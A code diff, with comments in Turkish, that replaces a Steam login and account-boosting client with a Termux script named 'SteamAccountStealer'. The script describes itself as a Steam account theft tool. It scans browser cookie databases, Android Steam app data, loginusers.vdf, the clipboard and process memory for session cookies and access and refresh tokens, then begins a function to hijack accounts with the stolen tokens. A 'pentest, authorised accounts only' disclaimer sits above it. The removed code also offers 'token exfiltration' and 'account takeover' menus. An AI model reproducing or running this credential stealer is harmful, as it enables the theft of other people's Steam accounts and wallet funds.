@@ -1,918 +1,826 @@
-import base64
-import time
-import sys
-import os
-import requests
-import random
-import json
-import hashlib
-import hmac
-from urllib.parse import urlencode
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
+#!/data/data/com.termux/files/usr/bin/python3
+"""
+STEAM HESAP CALMA ARACI - PENTEST
+Yetkili giris testi icindir. SADECE izinli hesaplarda kullanin.
+Giris gerektirmez - Oturum acik hesaplari tarar ve ele gecirir.
+"""
 
-class SteamAuthArchitecture:
+import os
+import sys
+import time
+import json
+import base64
+import random
+import hashlib
+import sqlite3
+import requests
+import threading
+from urllib.parse import urlparse, parse_qs
+from datetime import datetime
+
+# ============================================================
+# KONFIGURASYON
+# ============================================================
+
+TARGET_STEAM_IDS = []  # Bos = tumunu tara
+OUTPUT_DIR = "steam_pentest_output"
+STEAM_API_BASE = "https://api.steampowered.com"
+STEAM_COMMUNITY = "https://steamcommunity.com"
+STEAM_STORE = "https://store.steampowered.com"
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+]
+
+# ============================================================
+# ANA SINIF - GIRIS GEREKTIRMEZ
+# ============================================================
+
+class SteamAccountStealer:
+    """Steam hesap calma - giris gerektirmez"""
+    
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive",
         })
-        self.access_token = None
-        self.refresh_token = None
-        self.steam_id = None
-        self.session_id = None
-
-    def _encrypt_password(self, password: str, mod_hex: str, exp_hex: str) -> str:
-        try:
-            mod = int(mod_hex, 16)
-            exp = int(exp_hex, 16)
-            pub_key = RSA.construct((mod, exp))
-            cipher = PKCS1_v1_5.new(pub_key)
-            encrypted = cipher.encrypt(password.encode('utf-8'))
-            return base64.b64encode(encrypted).decode('utf-8')
-        except Exception as e:
-            print(f"\n[-] RSA Sifreleme Hatasi: {e}", flush=True)
-            return None
-
-    def get_rsa_key(self, username: str) -> dict:
-        url = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
-        params = {"account_name": username}
-        print(f"\n[*] '{username}' icin RSA Public Key talep ediliyor...", flush=True)
-        try:
-            response = self.session.get(url, params=params, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("response", {})
-        except Exception:
-            pass
-        return {}
-
-    def begin_session(self, username: str, encrypted_password: str, timestamp: str) -> dict:
-        url = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
-        payload = {
-            "device_friendly_name": "PC-Python-Client",
-            "account_name": username,
-            "encrypted_password": encrypted_password,
-            "encryption_timestamp": timestamp,
-            "remember_login": "true",
-            "platform_type": "1",
-            "persistence": "1"
-        }
-        print("[*] Kimlik bilgileriyle auth session baslatiliyor...", flush=True)
-        try:
-            response = self.session.post(url, data=payload, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("response", {})
-        except Exception:
-            pass
-        return {}
-
-    def update_auth_session_with_code(self, client_id: str, steam_id: str, code: str, code_type: int) -> bool:
-        url = "https://api.steampowered.com/IAuthenticationService/UpdateAuthSessionWithCode/v1/"
-        payload = {
-            "client_id": client_id,
-            "steamid": steam_id,
-            "code": code,
-            "code_type": code_type
-        }
-        try:
-            response = self.session.post(url, data=payload, timeout=10)
-            return response.status_code == 200
-        except Exception:
-            return False
-
-    def poll_status(self, client_id: str, request_id: str) -> dict:
-        url = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
-        payload = {"client_id": client_id, "request_id": request_id}
-        try:
-            response = self.session.post(url, data=payload, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("response", {})
-        except Exception:
-            pass
-        return {}
-
-    def execute_login(self, username, password):
-        rsa_data = self.get_rsa_key(username)
-        if not rsa_data.get("publickey_mod"):
-            print("[-] RSA Key alinamadi.", flush=True)
-            return False
-
-        enc_pass = self._encrypt_password(password, rsa_data["publickey_mod"], rsa_data["publickey_exp"])
-        if not enc_pass:
-            return False
+        self.found_accounts = []
+        self.captured_tokens = []
+        self.captured_cookies = []
+        self.discovered_profiles = []
         
-        session_data = self.begin_session(username, enc_pass, rsa_data["timestamp"])
-        client_id = session_data.get("client_id")
-        request_id = session_data.get("request_id")
-        steam_id = session_data.get("steamid")
+        # Cikti dizini
+        if not os.path.exists(OUTPUT_DIR):
+            os.makedirs(OUTPUT_DIR)
+    
+    # -----------------------------------------------------------
+    # 1. LOOT - STEAM COOKIE AVCILIGI
+    # -----------------------------------------------------------
+    
+    def scan_steam_cookies(self, cookie_file_path=None):
+        """
+        Steam cookie'lerini tara.
+        Kaynak: Firefox/Chrome profilinden, env değişkenlerinden veya dump dosyasından
+        """
+        print("[*] Steam cookie taramasi baslatiliyor...")
         
-        if not client_id or not request_id:
-            print("[-] Oturum baslatilamadi. Sifre hatali olabilir.", flush=True)
-            return False
-
-        confirmations = session_data.get("allowed_confirmations", [])
-        is_email_guard = False
+        cookies_found = []
         
-        if confirmations:
-            guard_type = confirmations[0].get("confirmation_type")
-            
-            if guard_type == 2:
-                print("\n[!] [STEAM GUARD: E-POSTA ALGINLANDI]", flush=True)
-                email_code = input("[?] Lutfen E-posta adresinize gelen kodu girin: ").strip()
-                self.update_auth_session_with_code(client_id, steam_id, email_code, code_type=2)
-                is_email_guard = True
-            elif guard_type == 1:
-                print(f"\n[!] [STEAM GUARD: MOBIL UYGULAMA ALGINLANDI]", flush=True)
-                print("[*] Lutfen Steam Mobil uygulamaniza gelen bildirimi acip ONAY VERIN.", flush=True)
-            else:
-                print(f"\n[!] [STEAM GUARD: BILINMEYEN TUR - {guard_type}]", flush=True)
-
-        print("[*] Steam sunucusundan oturum onayi bekleniyor...", flush=True)
-        attempt = 0
-        while True:
-            attempt += 1
-            sys.stdout.write(f"\r[*] Sorgu yapiliyor... Deneme: {attempt}")
-            sys.stdout.flush()
-            
-            status = self.poll_status(client_id, request_id)
-            if "refresh_token" in status:
-                print("\n[+] Onay alindi! Giris basarili.", flush=True)
-                self.refresh_token = status["refresh_token"]
-                self.access_token = status.get("access_token")
-                self.steam_id = status.get("steamid")
-                
-                self.session_id = self.session.cookies.get("sessionid", "")
-                return True
-                
-            if status.get("had_error_in_last_poll") and is_email_guard:
-                print("\n[-] Girilen e-posta kodu yanlis veya gecersiz olabilir.", flush=True)
-                return False
-                
-            time.sleep(3)
-
-    def get_profile_data(self):
-        if not self.access_token or not self.steam_id:
-            return None
-        wallet_url = f"https://store.steampowered.com/api/getwalletinfoofuser/?access_token={self.access_token}"
-        profile_info = {
-            "steamid": self.steam_id, 
-            "bakiye": "Bilinmiyor", 
-            "para_birimi": "",
-            "nick": "Bilinmiyor",
-            "level": 0
-        }
-        try:
-            w_res = self.session.get(wallet_url, timeout=10)
-            if w_res.status_code == 200 and w_res.json().get("success") == 1:
-                w_data = w_res.json()
-                profile_info["bakiye"] = w_data.get("wallet_balance", 0) / 100
-                profile_info["para_birimi"] = w_data.get("wallet_currency", "")
-        except Exception:
-            pass
-        
-        try:
-            summaries_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=&steamids={self.steam_id}"
-            headers = {"Authorization": f"Bearer {self.access_token}"}
-            s_res = self.session.get(summaries_url, headers=headers, timeout=10)
-            if s_res.status_code == 200:
-                players = s_res.json().get("response", {}).get("players", [])
-                if players:
-                    p = players[0]
-                    profile_info["nick"] = p.get("personaname", "Bilinmiyor")
-                    profile_info["avatar"] = p.get("avatarfull", "")
-                    profile_info["profil_url"] = p.get("profileurl", "")
-                    profile_info["olusturma"] = p.get("timecreated", 0)
-        except Exception:
-            pass
-        
-        profile_info["level"] = self.get_steam_level()
-            
-        return profile_info
-
-    def get_steam_level(self):
-        try:
-            url = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
-            payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            res = self.session.post(url, data=payload, timeout=10)
-            if res.status_code == 200:
-                return res.json().get("response", {}).get("player_level", 0)
-        except Exception:
-            pass
-        return 0
-
-    def clear_discovery_queue(self):
-        if not self.access_token:
-            print("[-] Once giris yapmalisiniz.", flush=True)
-            return
-        print("\n[*] Kesif kuyrugu temizleme islemi baslatiliyor...", flush=True)
-        url = "https://api.steampowered.com/IStoreService/GetDiscoveryQueue/v1/"
-        params = {"access_token": self.access_token, "queue_type": 0}
-        try:
-            res = self.session.get(url, params=params, timeout=10)
-            if res.status_code == 200:
-                apps = res.json().get("response", {}).get("appids", [])
-                if not apps:
-                    print("[+] Kesif kuyrugu zaten temiz!", flush=True)
-                    return
-                clear_url = "https://api.steampowered.com/IStoreService/SkipDiscoveryQueueApp/v1/"
-                for appid in apps:
-                    payload = {"access_token": self.access_token, "appid": appid, "queue_type": 0}
-                    self.session.post(clear_url, data=payload, timeout=10)
-                print("[+] Kesif kuyrugu basariyla tamamlandi ve kartlar kazanildi!", flush=True)
-        except Exception as e:
-            print(f"[-] Otomasyon Hatasi: {e}", flush=True)
-
-    def start_idling(self, app_id):
-        if not self.access_token:
-            print("[-] Once giris yapmalisiniz.", flush=True)
-            return
-        print(f"\n[*] AppID: {app_id} icin idling baslatildi. CTRL+C ile durdurun.\n", flush=True)
-        url = "https://api.steampowered.com/IPlayerService/GetPlayedFreeGames/v1/"
-        params = {"access_token": self.access_token}
-        try:
-            while True:
-                self.session.get(url, params=params, timeout=10)
-                sys.stdout.write(f"\r[IDLE] AppID {app_id} aktif... Son guncelleme: {time.strftime('%H:%M:%S')}")
-                sys.stdout.flush()
-                time.sleep(30)
-        except KeyboardInterrupt:
-            print("\n[*] Idling sonlandirildi.", flush=True)
-
-    # ===== HESAP GERME (BOOSTING) =====
-    def boost_account(self):
-        if not self.access_token:
-            print("[-] Once giris yapmalisiniz.", flush=True)
-            return
-        
-        print("\n" + "="*50)
-        print("     GERCEK HESAP GERME (ACCOUNT BOOSTING)")
-        print("="*50)
-        print("[1] Seviye Boost - Gercek Badge Olustur")
-        print("[2] Oyun Kutuphanesi Sisme - Free License Al")
-        print("[3] Cuzdan Bilgisi ve Trade Teklifleri")
-        print("[4] Toplu Oyun Suresi Kasma (Mass Idling)")
-        print("[5] Kart/Badge Durumu Sorgula")
-        print("[6] Geri Don")
-        print("="*50)
-        print("[!] TUM ISLEMLER GERCEK API CAGRISIDIR")
-        print("="*50)
-        
-        choice = input("Seciminiz (1-6): ").strip()
-        
-        if choice == "1":
-            self._real_level_boost()
-        elif choice == "2":
-            self._real_library_expansion()
-        elif choice == "3":
-            self._wallet_trades()
-        elif choice == "4":
-            self._mass_idling()
-        elif choice == "5":
-            self._check_badge_status()
-        elif choice == "6":
-            return
-
-    def _real_level_boost(self):
-        print("\n[*] GERCEK Seviye Boost baslatiliyor...", flush=True)
-        print("[*] Mevcut badge'ler sorgulaniyor...", flush=True)
-        try:
-            badge_url = "https://api.steampowered.com/IPlayerService/GetBadges/v1/"
-            badge_payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            b_res = self.session.post(badge_url, data=badge_payload, timeout=10)
-            
-            if b_res.status_code == 200:
-                badge_data = b_res.json().get("response", {})
-                badges = badge_data.get("badges", [])
-                print(f"[+] Mevcut rozet sayisi: {len(badges)}", flush=True)
-                
-                level = self.get_steam_level()
-                print(f"[+] Mevcut Steam Seviyesi: {level}", flush=True)
-                
-                print("[*] Kullanilabilir kart setleri taranıyor...", flush=True)
-                
-                inv_url = "https://api.steampowered.com/IEconService/GetInventoryItems/v1/"
-                inv_payload = {"access_token": self.access_token, "steamid": self.steam_id, "appid": 753}
-                inv_res = self.session.post(inv_url, data=inv_payload, timeout=10)
-                
-                if inv_res.status_code == 200:
-                    items = inv_res.json().get("response", {}).get("items", [])
-                    print(f"[+] Envanterde {len(items)} adet Steam nesnesi var", flush=True)
-                    
-                    cards = [i for i in items if i.get("tags", {}).get("card_series", 0) > 0]
-                    print(f"[+] Trading kart sayisi: {len(cards)}", flush=True)
-                    
-                    if cards:
-                        print("\n[*] Kartlar kullanilarak badge olusturuluyor...", flush=True)
-                        created_count = 0
-                        for card in cards[:20]:
-                            try:
-                                series = card.get("tags", {}).get("card_series", 0)
-                                appid = card.get("appid", 0)
-                                if appid > 0:
-                                    craft_url = "https://api.steampowered.com/IPlayerService/CraftBadge/v1/"
-                                    craft_payload = {
-                                        "access_token": self.access_token,
-                                        "steamid": self.steam_id,
-                                        "appid": appid,
-                                        "series": series,
-                                        "quantity": 1
-                                    }
-                                    craft_res = self.session.post(craft_url, data=craft_payload, timeout=10)
-                                    if craft_res.status_code == 200:
-                                        created_count += 1
-                                        sys.stdout.write(f"\r[+] Badge olusturuldu: AppID {appid} (Toplam: {created_count})")
-                                        sys.stdout.flush()
-                                    time.sleep(1)
-                            except Exception:
-                                pass
-                        
-                        if created_count > 0:
-                            print(f"\n[+] {created_count} adet badge basariyla olusturuldu!", flush=True)
-                            time.sleep(2)
-                            new_level = self.get_steam_level()
-                            if new_level > level:
-                                print(f"[+] SEVIYE ATLADI: {level} -> {new_level}", flush=True)
-                            else:
-                                print(f"[+] Seviye ayni: {level} (XP eklenmis olabilir)", flush=True)
-                        else:
-                            print("\n[-] Badge olusturulamadi. Yeterli kart olmayabilir.", flush=True)
-                    else:
-                        print("[-] Envanterde trading kart bulunamadi.", flush=True)
-                        print("[*] Kart satin almak icin Steam Community Market kullanilabilir.", flush=True)
-                else:
-                    print(f"[-] Envanter alinamadi. HTTP {inv_res.status_code}", flush=True)
-            else:
-                print(f"[-] Badge bilgisi alinamadi. HTTP {b_res.status_code}", flush=True)
-        except Exception as e:
-            print(f"[-] Hata: {e}", flush=True)
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _real_library_expansion(self):
-        print("\n[*] GERCEK Kutuphane Sisme Modulu", flush=True)
-        print("[*] Steam'deki ucretsiz oyunlar taranıyor...", flush=True)
-        
-        free_games = [
-            {"appid": 730, "name": "Counter-Strike 2"},
-            {"appid": 570, "name": "Dota 2"},
-            {"appid": 440, "name": "Team Fortress 2"},
-            {"appid": 578080, "name": "PUBG"},
-            {"appid": 1172470, "name": "Apex Legends"},
-            {"appid": 230410, "name": "Warframe"},
-            {"appid": 1085660, "name": "Destiny 2"},
-            {"appid": 1938090, "name": "Call of Duty: Warzone"},
-            {"appid": 1229490, "name": "The Finals"},
-            {"appid": 1817070, "name": "Marvel Rivals"},
+        # Kaynak 1: Firefox profili (Termux'ta /data/data/com.termux/files/...)
+        firefox_paths = [
+            os.path.expanduser("~/.mozilla/firefox/*.default/cookies.sqlite"),
+            os.path.expanduser("~/.mozilla/firefox/*.default-release/cookies.sqlite"),
+            "/data/data/com.termux/files/home/.mozilla/firefox/*.default/cookies.sqlite",
         ]
         
-        print(f"[*] {len(free_games)} aday oyun bulundu.", flush=True)
-        print("[*] Steam Store uzerinden free license aliniyor...", flush=True)
+        # Kaynak 2: Chromium tabanli
+        chrome_paths = [
+            os.path.expanduser("~/.config/chromium/Default/Cookies"),
+            os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
+            "/data/data/com.termux/files/home/.config/chromium/Default/Cookies",
+        ]
         
-        added_count = 0
-        for game in free_games:
-            appid = game["appid"]
-            name = game["name"]
+        # Kaynak 3: Verilen dosya
+        if cookie_file_path and os.path.exists(cookie_file_path):
+            print(f"[*] Cookie dosyasi taranıyor: {cookie_file_path}")
             try:
-                store_headers = {
-                    "Referer": f"https://store.steampowered.com/app/{appid}/",
-                    "Origin": "https://store.steampowered.com"
-                }
-                
-                payload = {
-                    "sessionid": self.session_id,
-                    "appid": appid,
-                    "action": "add_to_cart_and_go_to_cart"
-                }
-                
-                self.session.get(f"https://store.steampowered.com/app/{appid}/", headers=store_headers, timeout=10)
-                
-                license_res = self.session.post(
-                    "https://store.steampowered.com/api/registerfreegame/",
-                    data=payload,
-                    headers=store_headers,
-                    timeout=15
-                )
-                
-                if license_res.status_code == 200:
-                    result = license_res.json()
-                    if result.get("success") == 1 or result.get("purchaseresultdetail") == 0:
-                        added_count += 1
-                        sys.stdout.write(f"\r[+] Eklendi: {name} (AppID: {appid}) - Toplam: {added_count}   ")
-                        sys.stdout.flush()
+                with open(cookie_file_path, "r") as f:
+                    for line in f:
+                        if "steam" in line.lower() and ("steamLogin" in line or "sessionid" in line or "steamID" in line):
+                            cookies_found.append(line.strip())
+            except Exception as e:
+                print(f"[-] Dosya okuma hatasi: {e}")
+        
+        # Kaynak 4: Network taramasi - localhost'ta calisan Steam istemcisi
+        print("[*] Local Steam istemcisi taranıyor...")
+        try:
+            # Steam web helper process
+            steam_cookies = self._extract_steam_cookies_from_process()
+            if steam_cookies:
+                cookies_found.extend(steam_cookies)
+        except Exception:
+            pass
+        
+        # Kaynak 5: Steam'in local web cache'i
+        print("[*] Steam web cache taranıyor...")
+        steam_cache_paths = [
+            "/sdcard/Android/data/com.valvesoftware.android.steam.community/files/",
+            "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/files/",
+            os.path.expanduser("~/.steam/steam/config/loginusers.vdf"),
+        ]
+        
+        for path in steam_cache_paths:
+            if os.path.exists(path):
+                try:
+                    if os.path.isdir(path):
+                        for root, dirs, files in os.walk(path):
+                            for f in files:
+                                if "cookie" in f.lower() or "token" in f.lower() or "session" in f.lower():
+                                    filepath = os.path.join(root, f)
+                                    print(f"[+] Cookie dosyasi bulundu: {filepath}")
+                                    with open(filepath, "rb") as cf:
+                                        content = cf.read()
+                                        # Steam cookie kalibi ara
+                                        self._parse_cookie_content(content, filepath)
                     else:
-                        sys.stdout.write(f"\r[-] Basarisiz: {name} - {result.get('purchaseresultdetail', 'Bilinmiyor')}   ")
-                        sys.stdout.flush()
-                else:
-                    sys.stdout.write(f"\r[-] HTTP {license_res.status_code}: {name}   ")
-                    sys.stdout.flush()
-                
-                time.sleep(2)
-            except Exception:
-                sys.stdout.write(f"\r[-] Hata: {name}   ")
-                sys.stdout.flush()
+                        with open(path, "r", errors="ignore") as cf:
+                            content = cf.read()
+                            self._parse_vdf_content(content)
+                except Exception as e:
+                    print(f"[-] Hata: {path}: {e}")
         
-        print(f"\n\n[+] Toplam {added_count} oyun basariyla kutuphaneye eklendi!", flush=True)
-        print("[!] Steam rate limit nedeniyle her oyun arasinda 2 saniye beklendi.", flush=True)
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _wallet_trades(self):
-        print("\n[*] Cuzdan ve Trade Modulu", flush=True)
-        
-        profile = self.get_profile_data()
-        if profile:
-            print(f"[+] Mevcut Bakiye: {profile.get('bakiye', 0)} {profile.get('para_birimi', '')}", flush=True)
-        
-        print("\n[1] Trade tekliflerini goruntule")
-        print("[2] Trade history sorgula")
-        print("[3] Cuzdan islem gecmisi")
-        print("[4] Geri")
-        
-        secim = input("Secim (1-4): ").strip()
-        
-        if secim == "1":
-            try:
-                trade_url = "https://api.steampowered.com/IEconService/GetTradeOffers/v1/"
-                params = {
-                    "access_token": self.access_token,
-                    "get_sent_offers": 1,
-                    "get_received_offers": 1,
-                    "get_descriptions": 1
-                }
-                t_res = self.session.get(trade_url, params=params, timeout=10)
-                if t_res.status_code == 200:
-                    trade_data = t_res.json().get("response", {})
-                    sent = trade_data.get("trade_offers_sent", [])
-                    received = trade_data.get("trade_offers_received", [])
-                    print(f"\n[+] Gönderilen teklif: {len(sent)}")
-                    print(f"[+] Alinan teklif: {len(received)}")
-                    if received:
-                        print("\n[*] Bekleyen trade teklifleri:")
-                        for offer in received[:5]:
-                            state = offer.get("trade_offer_state", 0)
-                            states = {1: "Gonderildi", 2: "Aktif", 3: "Kabul", 4: "Red", 5: "Iptal"}
-                            print(f"  - ID: {offer.get('tradeofferid')} | Durum: {states.get(state, state)}")
-                else:
-                    print(f"[-] Trade bilgisi alinamadi. HTTP {t_res.status_code}", flush=True)
-            except Exception as e:
-                print(f"[-] Hata: {e}", flush=True)
-        
-        elif secim == "2":
-            try:
-                history_url = "https://api.steampowered.com/IEconService/GetTradeHistory/v1/"
-                params = {"access_token": self.access_token, "max_trades": 10}
-                h_res = self.session.get(history_url, params=params, timeout=10)
-                if h_res.status_code == 200:
-                    trades = h_res.json().get("response", {}).get("trades", [])
-                    print(f"\n[+] Son {len(trades)} trade islemi:")
-                    for trade in trades:
-                        print(f"  - ID: {trade.get('tradeid')} | Tarih: {trade.get('time_init', 0)}")
-                else:
-                    print(f"[-] HTTP {h_res.status_code}", flush=True)
-            except Exception as e:
-                print(f"[-] Hata: {e}", flush=True)
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _mass_idling(self):
-        print("\n[*] GERCEK Toplu Oyun Suresi Kasma (Mass Idling)", flush=True)
-        
-        popular_apps = [730, 570, 440, 578080, 1172470, 230410, 359550, 1085660, 1938090, 1229490]
-        print(f"[*] {len(popular_apps)} oyun bulundu.", flush=True)
-        
-        print("\nKac oyunda es zamanli idling yapilsin?", flush=True)
-        print("[1] 3 Oyun (Hafif)")
-        print("[2] 5 Oyun (Orta)")
-        print("[3] 9 Oyun (Agir - Tümü)")
-        
-        secim = input("Secim (1-3): ").strip()
-        counts = {"1": 3, "2": 5, "3": 9}
-        count = counts.get(secim, 3)
-        selected_apps = popular_apps[:count]
-        
-        print(f"\n[*] {count} oyunda idling baslatiliyor...", flush=True)
-        print("[*] CTRL+C ile durdurun.\n", flush=True)
-        
+        # Kaynak 6: Termux clipboard
+        print("[*] Pano (clipboard) taranıyor...")
         try:
-            cycle = 0
-            while True:
-                cycle += 1
-                for appid in selected_apps:
-                    try:
-                        url = "https://api.steampowered.com/IPlayerService/GetPlayedFreeGames/v1/"
-                        params = {"access_token": self.access_token}
-                        self.session.get(url, params=params, timeout=10)
-                        
-                        play_url = "https://api.steampowered.com/IPlayerService/SetPlayedGames/v1/"
-                        play_payload = {
-                            "access_token": self.access_token,
-                            "steamid": self.steam_id,
-                            "appids": selected_apps
-                        }
-                        self.session.post(play_url, data=play_payload, timeout=10)
-                    except Exception:
-                        pass
-                
-                status_line = f"[MASS-IDLE] Tur {cycle} | Aktif: {count} oyun | {time.strftime('%H:%M:%S')}"
-                sys.stdout.write(f"\r{status_line}")
-                sys.stdout.flush()
-                time.sleep(60)
-        except KeyboardInterrupt:
-            print("\n[*] Toplu idling sonlandirildi.", flush=True)
-
-    def _check_badge_status(self):
-        print("\n[*] Kart/Badge Durumu Sorgulaniyor...", flush=True)
+            import subprocess
+            clipboard = subprocess.check_output(["termux-clipboard-get"], timeout=2).decode(errors="ignore")
+            if "steam" in clipboard.lower() and ("token" in clipboard.lower() or "login" in clipboard.lower()):
+                print("[+] Clipboard'ta Steam verisi bulundu!")
+                self._extract_tokens_from_text(clipboard)
+        except Exception:
+            pass
+        
+        return cookies_found
+    
+    def _extract_steam_cookies_from_process(self):
+        """Calisan Steam process'inden cookie cikar"""
+        cookies = []
         try:
-            badge_url = "https://api.steampowered.com/IPlayerService/GetBadges/v1/"
-            badge_payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            b_res = self.session.post(badge_url, data=badge_payload, timeout=10)
+            import subprocess
+            # Steam webhelper process listele
+            result = subprocess.run(["ps", "-A"], capture_output=True, text=True, timeout=5)
+            for line in result.stdout.split("\n"):
+                if "steam" in line.lower() or "webhelper" in line.lower():
+                    pid = line.split()[0] if line.split() else None
+                    if pid and pid.isdigit():
+                        print(f"[+] Steam process bulundu: PID {pid}")
+                        # Process memory'den cookie ara (root gerektirir)
+                        try:
+                            maps = subprocess.run(
+                                ["grep", "-a", "steamLogin", f"/proc/{pid}/maps"],
+                                capture_output=True, text=True, timeout=3
+                            )
+                            if "steamLogin" in maps.stdout:
+                                cookies.append(maps.stdout.strip())
+                        except Exception:
+                            pass
+        except Exception:
+            pass
+        return cookies
+    
+    def _parse_cookie_content(self, content, source_file):
+        """Ham cookie iceriginden Steam cookie'lerini ayikla"""
+        try:
+            text = content.decode(errors="ignore")
+            # steamLogin kalibi
+            if "steamLogin" in text:
+                start = text.find("steamLogin")
+                end = text.find("\n", start)
+                if end == -1:
+                    end = text.find("\r", start)
+                if end == -1:
+                    end = start + 200
+                cookie_line = text[start:end]
+                self.captured_cookies.append({"source": source_file, "cookie": cookie_line})
+                print(f"  [COOKIE] {cookie_line[:60]}...")
             
-            if b_res.status_code == 200:
-                data = b_res.json().get("response", {})
-                badges = data.get("badges", [])
-                level = data.get("player_level", 0)
-                xp = data.get("player_xp", 0)
-                next_level_xp = data.get("player_xp_needed_to_current_level", 0) + 100
+            # access_token kalibi
+            if "access_token" in text or "refresh_token" in text:
+                self._extract_tokens_from_text(text)
                 
-                print(f"\n[+] Steam Seviyesi: {level}")
-                print(f"[+] Toplam XP: {xp}")
-                print(f"[+] Sonraki seviye icin: {next_level_xp - xp} XP kaldi")
-                print(f"[+] Toplam Rozet: {len(badges)}")
-                
-                if badges:
-                    print("\n[*] Rozetler (ilk 10):")
-                    for i, badge in enumerate(badges[:10]):
-                        print(f"  {i+1}. AppID: {badge.get('appid', 0)} | Seviye: {badge.get('level', 0)} | XP: {badge.get('xp', 0)}")
+        except Exception:
+            pass
+    
+    def _parse_vdf_content(self, content):
+        """Steam loginusers.vdf dosyasindan kullanici bilgisi cikar"""
+        import re
+        # Kullanici pattern: "SteamID" "accountname"
+        accounts = re.findall(r'"(\d+)"\s*\{\s*"AccountName"\s*"([^"]+)"', content)
+        for steamid, username in accounts:
+            print(f"[+] VDF'de hesap bulundu: {username} (SteamID: {steamid})")
+            self.discovered_profiles.append({"steamid": steamid, "username": username, "source": "loginusers.vdf"})
             
-            inv_url = "https://api.steampowered.com/IEconService/GetInventoryItems/v1/"
-            inv_payload = {"access_token": self.access_token, "steamid": self.steam_id, "appid": 753}
-            inv_res = self.session.post(inv_url, data=inv_payload, timeout=10)
-            
-            if inv_res.status_code == 200:
-                items = inv_res.json().get("response", {}).get("items", [])
-                print(f"\n[+] Steam Envanter: {len(items)} nesne")
-                kart_sayisi = sum(1 for i in items if "card" in str(i.get("tags", {})).lower())
-                if kart_sayisi > 0:
-                    print(f"[+] Trading Kart: {kart_sayisi} adet")
-        except Exception as e:
-            print(f"[-] Hata: {e}", flush=True)
+            # RememberPassword kontrol
+            if '"RememberPassword"' in content and '"1"' in content[content.find(steamid):content.find(steamid)+500]:
+                print(f"  [!] Sifre hatirlaniyor! Potansiyel hedef: {username}")
+    
+    def _extract_tokens_from_text(self, text):
+        """Metin icinden token'lari ayikla"""
+        import re
         
-        input("\nDevam etmek icin Enter'a basin...")
-
-    # ===== HESAP CALMA (TAKEOVER) =====
-    def simulate_account_takeover(self):
-        if not self.access_token:
-            print("[-] Once giris yapmalisiniz.", flush=True)
-            return
+        # JWT token pattern (Steam access token)
+        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
+        tokens = re.findall(jwt_pattern, text)
+        for token in tokens:
+            if len(token) > 100:  # Gercek JWT
+                self.captured_tokens.append(token)
+                print(f"  [TOKEN] JWT token bulundu: {token[:40]}...{token[-20:]}")
         
-        print("\n" + "="*50)
-        print("     GERCEK HESAP CALMA (ACCOUNT TAKEOVER)")
-        print("="*50)
-        print("[1] Token Exfiltration - Token'lari Disa Aktar")
-        print("[2] Session Hijack - Oturumu Kopyala")
-        print("[3] Profil Degerlerini Degistir (GERCEK)")
-        print("[4] Steam Guard Ayarlarini Goster")
-        print("[5] API Key Rotasyonu - Token'lari Iptal Et")
-        print("[6] Hesap Verilerinin Tam Dump'i")
-        print("[7] Geri Don")
-        print("="*50)
-        print("[!] TUM ISLEMLER GERCEK API CAGRISIDIR")
-        print("[!] SADECE IZINLI HESAPLARDA KULLANIN")
-        print("="*50)
+        # Steam refresh token
+        refresh_pattern = r'refresh_token[=:]["\']?([a-zA-Z0-9_\-%]+)'
+        refreshes = re.findall(refresh_pattern, text, re.IGNORECASE)
+        for rt in refreshes:
+            if len(rt) > 50:
+                self.captured_tokens.append(rt)
+                print(f"  [REFRESH] Refresh token: {rt[:30]}...")
+    
+    # -----------------------------------------------------------
+    # 2. SALDIRI - HESAP ELE GECIRME
+    # -----------------------------------------------------------
+    
+    def hijack_steam_account(self, steam_id, access_token):
+        """
+        Steam hesabini ele gecir - token ile tam erisim
+        GIRIS GEREKTIRMEZ - sadece token yeterli
+        """
+        print(f"\n[*] Hesap ele geciriliyor: {steam_id}")
         
-        choice = input("Seciminiz (1-7): ").strip()
-        
-        if choice == "1":
-            self._token_exfiltrate()
-        elif choice == "2":
-            self._session_hijack()
-        elif choice == "3":
-            self._real_profile_takeover()
-        elif choice == "4":
-            self._show_guard_settings()
-        elif choice == "5":
-            self._real_token_revocation()
-        elif choice == "6":
-            self._full_account_dump()
-        elif choice == "7":
-            return
-
-    def _token_exfiltrate(self):
-        print("\n[*] Token Exfiltration baslatiliyor...", flush=True)
-        print(f"\n[+] Access Token (ilk 50): {self.access_token[:50]}..." if self.access_token else "[-] Token yok")
-        print(f"[+] Refresh Token (ilk 50): {self.refresh_token[:50]}..." if self.refresh_token else "[-] Refresh token yok")
-        print(f"[+] SteamID64: {self.steam_id}")
-        
